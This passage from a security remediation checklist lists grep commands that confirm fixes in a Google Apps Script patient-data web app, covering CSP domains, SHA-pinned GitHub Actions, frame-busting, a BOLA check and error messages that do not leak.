# 6. Verify CSP connect-src includes both GAS domains (C6):
grep -o "connect-src[^;]*" index.html
# Expect: both script.google.com AND script.googleusercontent.com

# 7. Verify column range is 10 not 9 in validateToken and loginOrRegister (C5):
grep -n "getRange(2, 1" apps-script/Code.gs
# Other sheets (PATIENTS, MEASUREMENTS, INVENTORY) use different column counts — only
# the getRange calls INSIDE validateToken and loginOrRegister should show 10 as the
# last argument. All other occurrences will have different (smaller) column counts.

# 8. Verify GitHub Actions are SHA-pinned, not tag-pinned (M7):
grep -rn "uses:" .github/workflows/
# Every "uses:" line should contain a 40-char hex SHA, not @v[0-9]

# 9. Verify frame-busting JS is present in index.html (L5):
grep -n "window.self" index.html

# 10. Verify BOLA check is present for getDashboard and getHistory (H3):
grep -n "_getTokenPatientId\|tokenPatientId" apps-script/Code.gs
# Expect: _getTokenPatientId() defined once, and called before BOTH getDashboard and getHistory

# 11. Verify error handlers never return raw err.message to clients (C4):
grep -n "jsonResponse.*err\.message\|error.*+.*err\.message\|error.*err\.message" apps-script/Code.gs
# Should return NO results — err.message must never appear in a jsonResponse() call
# or be concatenated into an error value. The safe comparison pattern:
#   var msg = err.message === 'Unauthorized' ? 'Unauthorized' : 'Internal error';
# is OK — it compares err.message but never returns it raw.
```
